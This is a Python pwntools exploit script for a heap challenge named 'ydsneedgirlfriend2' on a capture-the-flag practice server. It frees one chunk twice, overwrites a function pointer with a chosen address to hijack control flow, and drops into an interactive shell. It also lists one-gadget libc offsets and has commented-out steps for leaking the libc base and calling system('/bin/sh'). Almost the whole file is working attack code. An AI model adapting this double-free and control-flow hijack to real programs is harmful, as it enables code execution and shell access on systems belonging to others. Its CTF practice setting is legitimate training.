import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='ydsneedgirlfriend2'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',29119)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter('u choice :','1')
			io.sendlineafter('Please input the length of her name:',str(a))
			io.sendafter('Please tell me her name:',c)

		def delete(a):
			io.sendlineafter('u choice :','2')
			io.sendlineafter('Index :',str(a))

		def show(a):
			io.sendlineafter('u choice :','3')
			io.sendlineafter('Index :',str(a))


		add(0x28,'aaa')
		# add(0x18,'bbb')
		# delete(1)
		delete(0)
		delete(0)
		add(0x18,p64(0x601000)+p64(0x400d86))
		show(0)
		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue